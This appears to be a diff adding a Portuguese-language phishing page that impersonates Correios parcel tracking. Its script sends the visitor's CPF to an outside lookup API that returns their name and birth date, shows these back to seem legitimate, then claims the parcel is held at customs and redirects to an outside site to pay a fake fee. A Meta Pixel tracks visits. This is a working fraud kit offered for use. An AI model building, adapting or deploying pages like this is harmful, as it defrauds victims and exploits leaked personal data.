@@ -1,0 +1,238 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Logística</title>
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/all.min.css">
+    <style>
+        /* Estilos personalizados */
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f9f9f9;
+        }
+
+        .btn-consultar {
+            font-size: 1.2rem;
+            padding: 15px 30px;
+            margin: 20px auto;
+        }
+
+        footer {
+            background-color: #003157;
+            color: white;
+            padding: 20px 0;
+            margin-top: 40px;
+        }
+
+        footer a {
+            color: white;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Estilos do pop-up */
+        #popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        #popup-content {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            max-width: 90%;
+            width: 400px;
+            text-align: center;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 5px solid rgba(0, 0, 0, 0.1);
+            border-top-color: #007bff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        @media (max-width: 768px) {
+            .btn-consultar {
+                width: 100%;
+                font-size: 1rem;
+                padding: 12px 20px;
+            }
+
+            #popup-content {
+                width: 90%;
+            }
+        }
+    </style>
+	<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1104779104742935');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1104779104742935&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+</head>
+<body>
+    <header class="w-100 bg-light py-3">
+        <div class="container text-center">
+            <a href="https://www.dafiti.com.br/" target="_blank">
+    <img src="images/correios.png" alt="Logo" height="40">
+</a>
+        </div>
+    </header>
+
+    <main class="container my-5">
+        <h1 class="text-center text-blue-dark mb-4">Rastreamento</h1>
+
+        <section class="bg-white p-4 rounded shadow">
+            <h5 class="text-center text-blue-dark mb-4">
+                <i class="fas fa-exclamation-triangle"></i> ACOMPANHE SUAS ENCOMENDAS ABAIXO
+            </h5>
+
+            <p class="text-center mb-4">Clique no botão abaixo para consultar suas mercadorias e acompanhar suas encomendas.</p>
+
+            <div class="d-flex justify-content-center">
+                <button type="button" class="btn btn-primary btn-consultar" id="consultar-mercadorias-btn">
+                    CONSULTAR MERCADORIAS
+                </button>
+            </div>
+
+            <div id="cpf-form" class="mt-4" style="display: none;">
+                <form action="javascript:void(0);" method="post" id="form-rastreamento">
+                    <label for="cpf">Digite seu CPF abaixo:</label>
+                    <div class="form-group">
+                        <input type="text" name="cpf" class="form-control" placeholder="CPF" required="" id="cpf">
+                    </div>
+                    <div class="form-group">
+                        <button type="button" class="btn btn-primary w-100" id="consultar-btn">Consultar</button>
+                    </div>
+                </form>
+            </div>
+        </section>
+    </main>
+
+    <!-- Pop-up de resultados -->
+    <div id="popup-overlay">
+        <div id="popup-content">
+            <div class="spinner" id="loading-spinner"></div>
+            <p id="message-step">Buscando sua encomenda…</p>
+            <h2 id="popup-title" class="d-none">Atenção, <span id="popup-nome-cliente"></span></h2>
+            <div id="popup-data-nascimento" class="d-none">
+                <p>Data de Nascimento: <strong id="popup-data-nascimento-text"></strong></p>
+            </div>
+            <div id="popup-results" class="d-none">
+                <p><i class="fas fa-exclamation-triangle"></i> <span class="text-danger">Identificamos que você realizou recentemente uma compra e a mercadoria encontra-se retida na alfândega devido à necessidade de regularização tributária. Para liberar sua encomenda, é necessário quitar a taxa correspondente.</span></p>
+                <button class="btn btn-success mt-3" id="confirmar-btn">PAGAR E LIBERAR ENCOMENDA</button>
+            </div>
+        </div>
+    </div>
+
+    <footer class="text-center">
+        <div class="container">
+            <p class="mb-3">© 2025 Todos os direitos reservados.</p>
+            <div class="d-flex justify-content-center flex-wrap">
+                <a href="https://www.nerdstore.com.br/" target="_blank">Política de Privacidade</a>
+                <a href="https://www.nerdstore.com.br/" target="_blank">Termos de Uso</a>
+                <a href="https://www.nerdstore.com.br/" target="_blank">Ajuda</a>
+                <a href="https://www.nerdstore.com.br/" target="_blank">Fale Conosco</a>
+                <a href="https://www.nerdstore.com.br/" target="_blank">Trabalhe Conosco</a>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Mostrar formulário de CPF ao clicar no botão
+        document.getElementById('consultar-mercadorias-btn').addEventListener('click', function () {
+            document.getElementById('cpf-form').style.display = 'block';
+            this.style.display = 'none'; // Oculta o botão após o clique
+        });
+
+        // Lógica de consulta do CPF
+        document.getElementById('consultar-btn').addEventListener('click', async function () {
+            const cpf = document.getElementById('cpf').value.replace(/\D/g, ''); // Remove caracteres não numéricos
+
+            if (!cpf) {
+                alert("O campo CPF é obrigatório!");
+                return;
+            }
+
+            // Desabilitar o botão e mostrar spinner
+            this.disabled = true;
+            this.textContent = 'Consultando...';
+            document.getElementById('popup-overlay').style.display = 'flex';
+            document.getElementById('loading-spinner').style.display = 'block';
+
+            try {
+                // Simulação de consulta ao CPF
+                const apiUrl = `https://apis-cpfapi.xb7m7k.easypanel.host/api/validar-cpf?cpf=${cpf}`;
+                const response = await fetch(apiUrl);
+                const data = await response.json();
+
+                if (data && data.NOME) {
+                    document.getElementById('popup-nome-cliente').textContent = data.NOME;
+                    if (data.DATA_NASCIMENTO) {
+                        document.getElementById('popup-data-nascimento').classList.remove('d-none');
+                        document.getElementById('popup-data-nascimento-text').textContent = data.DATA_NASCIMENTO;
+                    }
+                } else {
+                    alert('CPF não encontrado ou inválido.');
+                    return;
+                }
+
+                // Simulação de etapas de verificação
+                setTimeout(() => document.getElementById('message-step').textContent = 'Verificando sua encomenda...', 1000);
+                setTimeout(() => document.getElementById('message-step').textContent = 'Localizando sua encomenda...', 3000);
+                setTimeout(() => {
+                    document.getElementById('loading-spinner').style.display = 'none';
+                    document.getElementById('message-step').style.display = 'none';
+                    document.getElementById('popup-title').classList.remove('d-none');
+                    document.getElementById('popup-results').classList.remove('d-none');
+                }, 5000);
+
+                // Redirecionamento ao confirmar
+                document.getElementById('confirmar-btn').addEventListener('click', () => {
+                    window.location.href = 'https://centralsegura.com/consultado';
+                });
+            } catch (error) {
+                console.error('Erro na consulta:', error);
+                alert('Ocorreu um erro ao consultar o CPF.');
+            } finally {
+                this.disabled = false;
+                this.textContent = 'Consultar';
+            }
+        });
+    </script>
+
+</body></html>
